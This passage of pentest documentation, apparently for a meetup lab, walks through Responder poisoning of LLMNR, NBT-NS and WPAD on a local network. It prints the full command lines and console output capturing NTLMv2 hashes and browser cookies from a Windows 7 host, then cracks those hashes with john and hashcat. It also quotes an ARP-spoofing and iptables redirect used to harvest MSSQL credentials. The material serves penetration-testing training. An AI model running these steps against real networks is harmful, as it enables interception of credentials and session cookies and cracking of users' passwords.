+<li><p class="first">Prior to running <a class="reference external" href="https://github.com/SpiderLabs/Responder">Responder</a> you should edit <code class="file docutils literal"><span class="pre">Responder.conf</span></code> to limit the following:</p>
+<ul>
+<li><p class="first">[Responder Core] SERVICE = On/Off</p>
+<p>At our pentest-meetup you’ll probably only want to allow SMB, HTTP, HTTPS, and DNS.</p>
+</li>
+<li><p class="first">[Responder Core] RespondTo = …</p>
+<p>At our pentest-meetup you’ll probably want to list the known Windows sacrificial lambs provided by your fellow pentesters.</p>
+</li>
+<li><p class="first">[HTTPS Server] cert = Certs/responder.crt &amp; key = Certs/responder.key</p>
+<p>A real exploit should not generate a certificate warning, so get get one and use it.</p>
+</li>
+</ul>
+</li>
+<li><p class="first">Clean up prior log files as needed:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+<span class="nv">RDIR</span><span class="o">=</span>/usr/share/responder
+<span class="nv">$SUDO</span> rm <span class="se">\</span>
+  <span class="nv">$RDIR</span>/*.<span class="o">{</span>log,txt<span class="o">}</span> <span class="se">\</span>
+  <span class="nv">$RDIR</span>/HTTPCookies/* <span class="se">\</span>
+  <span class="nv">$RDIR</span>/Responder-Session.log
+</pre></div>
+</div>
+</li>
+</ol>
+</li>
+<li><p class="first">Run first without generating any poisoned responses using the “-A” option.</p>
+</li>
+<li><p class="first">After observing for a while, turn on the services required to attack the selected victims.</p>
+</li>
+</ol>
+<p>Here we illustrate running in analyze mode: a Windows 7 client taxing/WORKGROUP (192.168.1.101) boots up, fires up IE, and then runs the <code class="docutils literal"><span class="pre">dir</span> <span class="pre">\\SERVER\SHARE</span></code> command; also a Brothers printer BRN30055C139BE5 (192.168.1.3) chimes in.</p>
+<blockquote>
+<div><div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"> hacker@kali:~/pentest/responder$ <span class="nv">IP</span><span class="o">=</span><span class="m">192</span>.168.1.105
+</span><span class="hll"> hacker@kali:~/pentest/responder$ <span class="nv">$SUDO</span> responder -A -i <span class="nv">$IP</span>
+</span> NBT Name Service/LLMNR Responder <span class="m">2</span>.0.
+ Please send bugs/comments to: lgaffie@trustwave.com
+ To <span class="nb">kill</span> this script hit CRTL-C
+
+ <span class="o">[</span>+<span class="o">]</span>NBT-NS, LLMNR <span class="p">&amp;</span> MDNS responder started
+ <span class="o">[</span>+<span class="o">]</span>Loading Responder.conf File..
+ Global Parameters set:
+ Responder is bound to this interface: ALL
+ Challenge set: <span class="m">1122334455667788</span>
+ WPAD Proxy Server: False
+<span class="hll"> WPAD script loaded:  <span class="k">function</span> FindProxyForURL<span class="o">(</span>url, host<span class="o">){</span><span class="k">if</span> <span class="o">((</span><span class="nv">host</span> <span class="o">==</span> <span class="s2">&quot;localhost&quot;</span><span class="o">)</span> <span class="o">||</span> shExpMatch<span class="o">(</span>host, <span class="s2">&quot;localhost.*&quot;</span><span class="o">)</span> <span class="o">||(</span><span class="nv">host</span> <span class="o">==</span> <span class="s2">&quot;127.0.0.1&quot;</span><span class="o">)</span> <span class="o">||</span> isPlainHostName<span class="o">(</span>host<span class="o">))</span> <span class="k">return</span> <span class="s2">&quot;DIRECT&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="o">(</span>dnsDomainIs<span class="o">(</span>host, <span class="s2">&quot;RespProxySrv&quot;</span><span class="o">)||</span>shExpMatch<span class="o">(</span>host, <span class="s2">&quot;(*.RespProxySrv|RespProxySrv)&quot;</span><span class="o">))</span> <span class="k">return</span> <span class="s2">&quot;DIRECT&quot;</span><span class="p">;</span> <span class="k">return</span> <span class="s1">&#39;PROXY ISAProxySrv:3141; DIRECT&#39;</span><span class="p">;</span><span class="o">}</span>
+</span><span class="hll"> HTTP Server: ON
+</span><span class="hll"> HTTPS Server: ON
+</span><span class="hll"> SMB Server: ON
+</span><span class="hll"> SMB LM support: False
+</span><span class="hll"> Kerberos Server: ON
+</span><span class="hll"> SQL Server: ON
+</span><span class="hll"> FTP Server: ON
+</span><span class="hll"> IMAP Server: ON
+</span><span class="hll"> POP3 Server: ON
+</span><span class="hll"> SMTP Server: ON
+</span><span class="hll"> DNS Server: ON
+</span><span class="hll"> LDAP Server: ON
+</span><span class="hll"> FingerPrint hosts: False
+</span><span class="hll"> Serving Executable via HTTP<span class="p">&amp;</span>WPAD: OFF
+</span><span class="hll"> Always Serving a Specific File via HTTP<span class="p">&amp;</span>WPAD: OFF
+</span>
+
+<span class="hll"> <span class="o">[</span>+<span class="o">]</span>Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
+</span>
+<span class="hll"> <span class="o">[</span>Analyze mode: LLMNR<span class="o">]</span> Host: <span class="m">169</span>.254.129.234 is looking <span class="k">for</span> : taxing.
+</span><span class="hll"> <span class="o">[</span>Analyze mode: LLMNR<span class="o">]</span> Host: <span class="m">192</span>.168.1.101 is looking <span class="k">for</span> : taxing.
+</span><span class="hll"> <span class="o">[</span>Analyze mode: LLMNR<span class="o">]</span> Host: <span class="m">192</span>.168.1.101 is looking <span class="k">for</span> : wpad.
+</span><span class="hll"> <span class="o">[</span>Analyze mode: NBT-NS<span class="o">]</span> Host: <span class="m">192</span>.168.1.101 is looking <span class="k">for</span> : WPAD. Service requested is: Workstation/Redirector Service.
+</span><span class="hll"> <span class="o">[</span>Analyze mode: Browser<span class="o">]</span>Datagram Request from IP: <span class="m">192</span>.168.1.101 hostname: TAXING via the: File Server Service. to: WORKGROUP. Service: Local Master Browser.
+</span><span class="hll"> <span class="o">[</span>Analyze mode: Browser<span class="o">]</span>Datagram Request from IP: <span class="m">192</span>.168.1.101 hostname: TAXING via the: File Server Service. to: WORKGROUP. Service: Local Master Browser.
+</span><span class="hll"> <span class="o">[</span>Analyze mode: Browser<span class="o">]</span>Datagram Request from IP: <span class="m">192</span>.168.1.101 hostname: TAXING via the: Workstation/Redirector Service. to: WORKGROUP. Service: Local Master Browser.
+</span><span class="hll"> <span class="o">[</span>Analyze mode: Browser<span class="o">]</span>Datagram Request from IP: <span class="m">192</span>.168.1.101 hostname: TAXING via the: Workstation/Redirector Service. to: WORKGROUP. Service: Browser Election Service.
+</span><span class="hll"> <span class="o">[</span>Analyze mode: Browser<span class="o">]</span>Datagram Request from IP: <span class="m">192</span>.168.1.101 hostname: TAXING via the: File Server Service. to: WORKGROUP. Service: Browser Election Service.
+</span><span class="hll"> <span class="o">[</span>Analyze mode LANMAN<span class="o">]</span>:
+</span><span class="hll"> <span class="o">[</span>!<span class="o">]</span>Domain detected on this network:
+</span><span class="hll">    -WORKGROUP
+</span><span class="hll"> <span class="o">[</span>!<span class="o">]</span>Workstations/Servers detected on Domain WORKGROUP:
+</span><span class="hll">    -TAXING
+</span><span class="hll">        <span class="o">[</span>-<span class="o">]</span>Os version is:Windows <span class="m">7</span>/Server 2008R2
+</span><span class="hll"> <span class="o">[</span>Analyze mode: Browser<span class="o">]</span>Datagram Request from IP: <span class="m">192</span>.168.1.3 hostname: BRN30055C139BE5 via the: Workstation/Redirector Service. to: WORKGROUP. Service: Browser Election Service.
+</span><span class="hll"> <span class="o">[</span>Analyze mode LANMAN<span class="o">]</span>:
+</span><span class="hll"> <span class="o">[</span>!<span class="o">]</span>Domain detected on this network:
+</span><span class="hll">    -WORKGROUP
+</span><span class="hll"> <span class="o">[</span>!<span class="o">]</span>Workstations/Servers detected on Domain WORKGROUP:
+</span><span class="hll">    -BRN30055C139BE5
+</span><span class="hll">    -TAXING
+</span><span class="hll">        <span class="o">[</span>-<span class="o">]</span>Os version is:Windows <span class="m">7</span>/Server 2008R2
+</span><span class="hll"> <span class="o">[</span>Analyze mode: LLMNR<span class="o">]</span> Host: <span class="m">192</span>.168.1.101 is looking <span class="k">for</span> : SERVER.
+</span><span class="hll"> <span class="o">[</span>Analyze mode: NBT-NS<span class="o">]</span> Host: <span class="m">192</span>.168.1.101 is looking <span class="k">for</span> : SERVER. Service requested is: File Server Service.
+</span></pre></div>
+</div>
+</div></blockquote>
+<p>Now we repeat the experiment to attack WPAD and SMB:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> responder -i <span class="nv">$IP</span> -w
+ls -lrt /user/share/responder/
+ls -lrt /user/share/responder/HTTPCookies/
+</pre></div>
+</div>
+<p>Running this gives the following hash in response to the “dir \SERVERSHARE” and cookies from HTTP traffic:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">LLMNR poisoned answer sent to this IP: 192.168.1.101. The requested name was : SERVER.</span>
+<span class="go">[+]SMB-NTLMv2 hash captured from :  192.168.1.101</span>
+<span class="go">[+]SMB complete hash is : jgm::taxing:1122334455667788:80F748A72D85988D6A969D05319FC6F4:01010000000000000F18587EE1A3D001FDB876F9C5B22DDC0000000002000A0073006D006200310032000100140053004500520056004500520032003000300038000400160073006D006200310032002E006C006F00630061006C0003002C0053004500520056004500520032003000300038002E0073006D006200310032002E006C006F00630061006C000500160073006D006200310032002E006C006F00630061006C000800300030000000000000000100000000200000327B8C4C70662C00D3F65C0550C12F3503F349FE17B292471833B989CF9FC4220A001000000000000000000000000000000000000900160063006900660073002F005300450052005600450052000000000000000000</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">^C</span>
+<span class="gp">hacker@kali:~/pentest/responder$</span> ls -lrt /usr/share/responder/
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">-rw-r--r-- 1 root root    532 Jun 10 17:57 LLMNR-NBT-NS.log</span>
+<span class="go">-rw-r--r-- 1 root root    607 Jun 10 17:57 SMB-NTLMv2-Client-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root   2973 Jun 10 17:57 Responder-Session.log</span>
+<span class="go">drwxr-xr-x 2 root root   4096 Jun 10 17:57 HTTPCookies</span>
+<span class="gp">hacker@kali:~/pentest/responder$</span> ls -lrt /usr/share/responder/HTTPCookies
+<span class="go">total 16</span>
+<span class="go">-rw-r--r-- 1 root root  95 Jun 10 17:56 HTTP-Cookie-request-www.msftncsi.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root 739 Jun 10 17:56 HTTP-Cookie-request-www.google.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root  94 Jun 10 17:57 HTTP-Cookie-request-pki.google.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root 115 Jun 10 17:57 HTTP-Cookie-request-crl.microsoft.com-from-192.168.1.101.txt</span>
+</pre></div>
+</div>
+<p>Now we repeat the experiment using the “–lm” option to see if we can get a LM response (no), the “-F” option to force authentication for WPAD, and “-f” to fingerprint the host. Interestingly enough, we get a hash just by booting up and logging on (without having to even open IE or trying the “dir \SERVERSHARE” command):</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> responder -i <span class="nv">$IP</span> -w -F -f
+ls -lrt /user/share/responder/
+ls -lrt /user/share/responder/HTTPCookies/
+</pre></div>
+</div>
+<p>Running this give the following NTLMv2 hash in response pre-fetching the <code class="file docutils literal"><span class="pre">wpad.dat</span></code>. Notice the “–lm” option did not force a LM hash. And there are tons more cookies due to vising a site loaded with them:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/responder$ $</span>SUDO responder -i <span class="nv">$IP</span> -w -F -f
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">[+]HTTP GET request from : 192.168.1.101. The HTTP URL requested was: /wpad.dat</span>
+<span class="go">[+]HTTP NTLMv2 hash captured from : 192.168.1.101</span>
+<span class="go">Complete hash is :  jgm::taxing:1122334455667788:3E86C99BDD81CF4F3227F87F12714331:010100000000000099C7A7EAE2A3D001EF2FF33947B4DBEB000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000CAAA5032737FD6A6F66349DABAD641A3EAF6B0862F4DA9031D94D6000DBC8A160A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E0031002E003100300035000000000000000000</span>
+<span class="go">[+] OsVersion is:Windows 7 Enterprise 7601 Service Pack 1</span>
+<span class="go">[+] ClientVersion is :Windows 7 Enterprise 6.1</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">^C</span>
+<span class="gp">hacker@kali:~/pentest/responder$</span> ls -lrt /usr/share/responder/
+<span class="go">total 592</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">-rw-r--r-- 1 root root    607 Jun 10 18:07 HTTP-NTLMv2-Client-192.168.1.101.txt</span>
+<span class="go">drwxr-xr-x 2 root root   4096 Jun 10 18:08 HTTPCookies</span>
+<span class="go">-rw-r--r-- 1 root root    617 Jun 10 18:08 LLMNR-NBT-NS.log</span>
+<span class="go">-rw-r--r-- 1 root root 119744 Jun 10 18:08 Responder-Session.log</span>
+<span class="gp">hacker@kali:~/pentest/responder$</span> ls -lrt /usr/share/responder/HTTPCookies
+<span class="go">total 80</span>
+<span class="go">-rw-r--r-- 1 root root   95 Jun 10 17:56 HTTP-Cookie-request-www.msftncsi.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root  739 Jun 10 17:56 HTTP-Cookie-request-www.google.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root   94 Jun 10 17:57 HTTP-Cookie-request-pki.google.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root  115 Jun 10 17:57 HTTP-Cookie-request-crl.microsoft.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root  206 Jun 10 18:07 HTTP-Cookie-request-ocsp.verisign.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root   95 Jun 10 18:07 HTTP-Cookie-request-crl.verisign.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root  188 Jun 10 18:08 HTTP-Cookie-request-ocsp.geotrust.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root  112 Jun 10 18:08 HTTP-Cookie-request-cdp1.public-trust.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root  104 Jun 10 18:08 HTTP-Cookie-request-crl.geotrust.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root 1028 Jun 10 18:08 HTTP-Cookie-request-ocsp.digicert.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root  217 Jun 10 18:08 HTTP-Cookie-request-vassg141.ocsp.omniroot.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root  199 Jun 10 18:08 HTTP-Cookie-request-gb.symcd.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root  330 Jun 10 18:08 HTTP-Cookie-request-crl3.digicert.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root  108 Jun 10 18:08 HTTP-Cookie-request-vassg141.crl.omniroot.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root   89 Jun 10 18:08 HTTP-Cookie-request-gb.symcb.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root  182 Jun 10 18:08 HTTP-Cookie-request-g.symcd.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root   99 Jun 10 18:08 HTTP-Cookie-request-g.symcb.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root  183 Jun 10 18:08 HTTP-Cookie-request-gv.symcd.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root  451 Jun 10 18:08 HTTP-Cookie-request-crl4.digicert.com-from-192.168.1.101.txt</span>
+<span class="go">-rw-r--r-- 1 root root   89 Jun 10 18:08 HTTP-Cookie-request-gv.symcb.com-from-192.168.1.101.txt</span>
+</pre></div>
+</div>
+<p>Notice that the NTLMv2 hashes are different: that’s because the client also generates it’s own challenge which is returned back in the response. This makes rainbow tables ineffective. Here we show how to crack the hash with a dictionary (seeded with the first entry being the actual password):</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># get the hashes into one file</span>
+rm -rf hashes.lst
+cat /usr/share/responder/HTTP-NTLMv2-Client-*.txt &gt;&gt; hashes.lst
+cat /usr/share/responder/SMB-NTLMv2-Client-*.txt &gt;&gt; hashes.lst
+<span class="c1"># add the actual password as the first entry in the password list</span>
+<span class="nb">echo</span> <span class="s2">&quot;pentest-meetup&quot;</span> &gt; password.lst
+zcat /usr/share/wordlists/rockyou.txt.gz &gt;&gt; password.lst
+<span class="c1"># running john is as simple as</span>
+/usr/sbin/john --wordlist<span class="o">=</span>password.lst hashes.lst <span class="p">|</span> tee cracked-john.txt
+<span class="c1"># hashcat requires more work and (for the first run) saying YES to a license</span>
+<span class="nv">MODE</span><span class="o">=</span><span class="k">$(</span>head -n <span class="m">1</span> hashes.lst <span class="p">|</span> python2 <span class="k">$(</span>which hashid<span class="k">)</span> -m <span class="p">|</span> <span class="se">\</span>
+    grep <span class="s1">&#39;Hashcat Mode:&#39;</span> <span class="p">|</span> head -n <span class="m">1</span> <span class="p">|</span> sed <span class="s1">&#39;s/^.*Hashcat Mode: //;s/]$//&#39;</span><span class="k">)</span>
+hashcat --hash-type<span class="o">=</span><span class="nv">$MODE</span> hashes.lst password.lst  <span class="p">|</span> tee cracked-hydra.txt
+</pre></div>
+</div>
+<p>Running this cracks the hash:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/responder$ #</span> get the hashes into one file
+<span class="gp">hacker@kali:~/pentest/responder$</span> rm -rf hashes.lst
+<span class="gp">hacker@kali:~/pentest/responder$</span> cat /usr/share/responder/HTTP-NTLMv2-Client-*.txt &gt;&gt; hashes.lst
+<span class="gp">hacker@kali:~/pentest/responder$</span> cat /usr/share/responder/SMB-NTLMv2-Client-*.txt &gt;&gt; hashes.lst
+<span class="gp">hacker@kali:~/pentest/responder$ #</span> add the actual password as the first entry in the password list
+<span class="gp">hacker@kali:~/pentest/responder$</span> <span class="nb">echo</span> <span class="s2">&quot;pentest-meetup&quot;</span> &gt; password.lst
+<span class="gp">hacker@kali:~/pentest/responder$</span> zcat /usr/share/wordlists/rockyou.txt.gz &gt;&gt; password.lst
+<span class="gp">hacker@kali:~/pentest/responder$ #</span> running john is as simple as
+<span class="hll"><span class="gp">hacker@kali:~/pentest/responder$</span> /usr/sbin/john --wordlist<span class="o">=</span>password.lst hashes.lst <span class="p">|</span> tee cracked-john.txt
+</span><span class="go">guesses: 2  time: 0:00:00:00 DONE (Wed Jun 10 18:25:26 2015)  c/s: 6942  trying: pentest-meetup - queen</span>
+<span class="go">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span>
+<span class="hll"><span class="go">Loaded 2 password hashes with 2 different salts (NTLMv2 C/R MD4 HMAC-MD5 [32/64])</span>
+</span><span class="hll"><span class="go">pentest-meetup   (jgm)</span>
+</span><span class="hll"><span class="go">pentest-meetup   (jgm)</span>
+</span><span class="gp">hacker@kali:~/pentest/responder$ #</span> hashcat requires more work and <span class="o">(</span><span class="k">for</span> the first run<span class="o">)</span> saying YES to a license
+<span class="gp">hacker@kali:~/pentest/responder$ MODE=$</span><span class="o">(</span>head -n <span class="m">1</span> hashes.lst <span class="p">|</span> python2 <span class="k">$(</span>which hashid<span class="k">)</span> -m <span class="p">|</span> <span class="se">\</span>
+&gt;     grep <span class="s1">&#39;Hashcat Mode:&#39;</span> <span class="p">|</span> head -n <span class="m">1</span> <span class="p">|</span> sed <span class="s1">&#39;s/^.*Hashcat Mode: //;s/]$//&#39;</span><span class="o">)</span>
+<span class="hll"><span class="gp">hacker@kali:~/pentest/responder$</span> hashcat --hash-type<span class="o">=</span><span class="nv">$MODE</span> hashes.lst password.lst  <span class="p">|</span> tee cracked-hydra.txt
+</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="hll"><span class="go">JGM::taxing:1122334455667788:3e86c99bdd81cf4f3227f87f12714331:010100000000000099c7a7eae2a3d001ef2ff33947b4dbeb000000000200060053004d0042000100160053004d0042002d0054004f004f004c004b00490054000400120073006d0062002e006c006f00630061006c000300280073006500720076006500720032003000300033002e0073006d0062002e006c006f00630061006c000500120073006d0062002e006c006f00630061006c000800300030000000000000000100000000200000caaa5032737fd6a6f66349dabad641a3eaf6b0862f4da9031d94d6000dbc8a160a001000000000000000000000000000000000000900240048005400540050002f003100390032002e003100360038002e0031002e003100300035000000000000000000:pentest-meetup</span>
+</span><span class="hll"><span class="go">JGM::taxing:1122334455667788:80f748a72d85988d6a969d05319fc6f4:01010000000000000f18587ee1a3d001fdb876f9c5b22ddc0000000002000a0073006d006200310032000100140053004500520056004500520032003000300038000400160073006d006200310032002e006c006f00630061006c0003002c0053004500520056004500520032003000300038002e0073006d006200310032002e006c006f00630061006c000500160073006d006200310032002e006c006f00630061006c000800300030000000000000000100000000200000327b8c4c70662c00d3f65c0550c12f3503f349fe17b292471833b989cf9fc4220a001000000000000000000000000000000000000900160063006900660073002f005300450052005600450052000000000000000000:pentest-meetup</span>
+</span>
+<span class="hll"><span class="go">All hashes have been recovered</span>
+</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="lm-ntlm-exploitation">
+<h2>6.12.2. LM &amp; NTLM exploitation<a class="headerlink" href="#lm-ntlm-exploitation" title="Permalink to this headline">¶</a></h2>
+<p><a class="reference external" href="https://www.owasp.org/images/3/37/OWASP-IL-2014-01_nhastie-presentation.pdf">NTLM Based Authentication in Web Applications: The Good, The Bad, and the NHASTIE</a> shows attack vectors for NTLM-based authentication.</p>
+<p><a class="reference external" href="http://digital-forensics.sans.org/blog/2012/02/29/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly">Protecting Privileged Domain Accounts: LM Hashes – The Good, the Bad, and the Ugly</a></p>
+<p><a class="reference external" href="http://security.stackexchange.com/questions/63890/does-windows-have-a-built-in-password-store/63909#63909">http://security.stackexchange.com/questions/63890/does-windows-have-a-built-in-password-store/63909#63909</a></p>
+<p><a class="reference external" href="http://digital-forensics.sans.org/blog/2012/03/09/protecting-privileged-domain-accounts-disabling-encrypted-passwords">http://digital-forensics.sans.org/blog/2012/03/09/protecting-privileged-domain-accounts-disabling-encrypted-passwords</a></p>
+<p><a class="reference external" href="http://digital-forensics.sans.org/blog/2012/02/29/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly">http://digital-forensics.sans.org/blog/2012/02/29/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly</a></p>
+<p><a class="reference external" href="http://securityxploded.com/windows-vault-password-decryptor.php">http://securityxploded.com/windows-vault-password-decryptor.php</a></p>
+<p><a class="reference external" href="http://www.darknet.org.uk/2015/02/windows-credentials-editor-wce-list-add-change-logon-sessions/">http://www.darknet.org.uk/2015/02/windows-credentials-editor-wce-list-add-change-logon-sessions/</a></p>
+<p><a class="reference external" href="http://tipstrickshack.blogspot.com/2013/02/how-to-get-windows-passwords-in-plain.html">http://tipstrickshack.blogspot.com/2013/02/how-to-get-windows-passwords-in-plain.html</a></p>
+<p><a class="reference external" href="http://en.wikipedia.org/wiki/Pass_the_hash">http://en.wikipedia.org/wiki/Pass_the_hash</a></p>
+<p><a class="reference external" href="http://en.wikipedia.org/wiki/SMBRelay">http://en.wikipedia.org/wiki/SMBRelay</a></p>
+<p><a class="reference external" href="https://technet.microsoft.com/library/security/ms08-068">https://technet.microsoft.com/library/security/ms08-068</a></p>
+<p><a class="reference external" href="https://technet.microsoft.com/library/security/ms06-030">https://technet.microsoft.com/library/security/ms06-030</a></p>
+<p><a class="reference external" href="https://technet.microsoft.com/library/security/ms05-011">https://technet.microsoft.com/library/security/ms05-011</a></p>
+<p><a class="reference external" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
+<p><a class="reference external" href="http://pentestmonkey.net/blog/mimikatz-tool-to-recover-cleartext-passwords-from-lsass">http://pentestmonkey.net/blog/mimikatz-tool-to-recover-cleartext-passwords-from-lsass</a></p>
+<p><a class="reference external" href="http://blog.opensecurityresearch.com/2012/06/using-mimikatz-to-dump-passwords.html">http://blog.opensecurityresearch.com/2012/06/using-mimikatz-to-dump-passwords.html</a></p>
+<p><a class="reference external" href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It.pdf">https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It.pdf</a></p>
+<p><a class="reference external" href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz">https://www.offensive-security.com/metasploit-unleashed/Mimikatz</a></p>
+</div>
+<div class="section" id="exploitable-services">
+<h2>6.12.3. Exploitable services<a class="headerlink" href="#exploitable-services" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="wpad">
+<h3>6.12.3.1. WPAD<a class="headerlink" href="#wpad" title="Permalink to this headline">¶</a></h3>
+<p><a class="reference external" href="https://github.com/SpiderLabs/Responder">Responder</a> can exploit Window’s broadcast attempts autodiscover a WPAD server, becoming a man-in-the middle by replacing the legitimate web proxy server. From <a class="reference external" href="https://github.com/SpiderLabs/Responder">Responder</a>:</p>
+<blockquote>
+<div>WPAD rogue transparent proxy server. This module will capture all HTTP requests from anyone launching Internet Explorer on the network. This module is higly effective. You can now send your custom Pac script to a victim and inject HTML into the server’s responses. See Responder.conf. This module is now enabled by default.</div></blockquote>
+<p><a class="reference external" href="https://www.trustedsec.com/july-2013/wpad-man-in-the-middle-clear-text-passwords/">WPAD Man in the Middle (Clear Text Passwords)</a> and <a class="reference external" href="http://resources.infosecinstitute.com/hacking-clients-wpad-web-proxy-auto-discovery-protocol/">Hacking Clients with WPAD (Web Proxy Auto-Discovery) Protocol</a>. describe how to accomplish the WPAD <a class="reference external" href="https://github.com/SpiderLabs/Responder">Responder</a> exploit.</p>
+<p>If you’re not familiar with WPAD, from <a class="reference external" href="http://en.wikipedia.org/wiki/Web_Proxy_Autodiscovery_Protocol">Wikipedia Web Proxy Autodiscovery Protocol</a>:</p>
+<blockquote>
+<div>The Web Proxy Auto-Discovery Protocol (WPAD) is a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods. Once detection and download of the configuration file is complete, it can be executed to determine the proxy for a specified URL. The WPAD protocol only outlines the mechanism for discovering the location of this file, but the most commonly deployed configuration file format is the <a class="reference external" href="http://en.wikipedia.org/wiki/Proxy_auto-config">proxy auto-config</a> format originally designed by Netscape in 1996 for Netscape Navigator 2.0.</div></blockquote>
+<p>If you’re not familiar with PAC, from <a class="reference external" href="http://en.wikipedia.org/wiki/Proxy_auto-config">Wikipedia Proxy auto-config</a>:</p>
+<blockquote>
+<div><p>A proxy auto-config (PAC) file defines how web browsers and other user agents can automatically choose the appropriate proxy server (access method) for fetching a given URL.</p>
+<p>A PAC file contains a JavaScript function “FindProxyForURL(url, host)”. This function returns a string with one or more access method specifications. These specifications cause the user agent to use a particular proxy server or to connect directly.</p>
+<p>Multiple specifications provide a fall-back when a proxy fails to respond. The browser fetches this PAC file before requesting other URLs. The URL of the PAC file is either configured manually or determined automatically by the Web Proxy Autodiscovery Protocol.</p>
+</div></blockquote>
+</div>
+<div class="section" id="mssql">
+<h3>6.12.3.2. MSSQL<a class="headerlink" href="#mssql" title="Permalink to this headline">¶</a></h3>
+<p>From <a class="reference external" href="http://breenmachine.blogspot.com/2014/12/mssql-mitm-ftw-ettercap-and-responder.html">MSSQL MITM FTW - Ettercap and Responder to Intercept (plaintext!) MSSQL Creds</a>:</p>
+<blockquote>
+<div><p>The first step was to identify the SQL server and setup Ettercap to ARP spoof traffic between the SQL server and the gateway. Easy enough - now the SQL server traffic is flowing through our machine.</p>
+<p>Next we run Responder.py and have it enable it’s SQL Server authentication listener. This spins up a “fake” SQL server that will log any credentials sent to it.</p>
+<p>Finally - a simple IPTables rule to redirect traffic bound for the real DBMS to the listener running on our machine “iptables -t nat -A PREROUTING -p tcp –dport 1433 -j REDIRECT –to-ports 1433”. This will break things. Any connections to the DBMS that are currently open will probably break, the client will try to re-authentication, we’ll catch the creds.</p>
+<p>SQL Server can then be used to pivot into the network/domain with xp_cmdshell, extract sensitive data etc…</p>
+</div></blockquote>
+<p>Another approach is described in <a class="reference external" href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Wendel-s-Small-Hacking-Tricks---Microsoft-SQL-Server-Edition/">Wendel’s Small Hacking Tricks - Microsoft SQL Server Edition</a>.</p>
+</div>
+<div class="section" id="ftp-http-imap-kerberos-ldap-pop3-smtp">
+<h3>6.12.3.3. FTP, HTTP, IMAP, Kerberos, LDAP, POP3, SMTP<a class="headerlink" href="#ftp-http-imap-kerberos-ldap-pop3-smtp" title="Permalink to this headline">¶</a></h3>
+<p>Similar exploits exist for FTP, HTTP, IMAP, Kerberos, LDAP, POP3, and SMTP. We leave these as an exercise for the reader.</p>
+</div>
+<div class="section" id="smb">
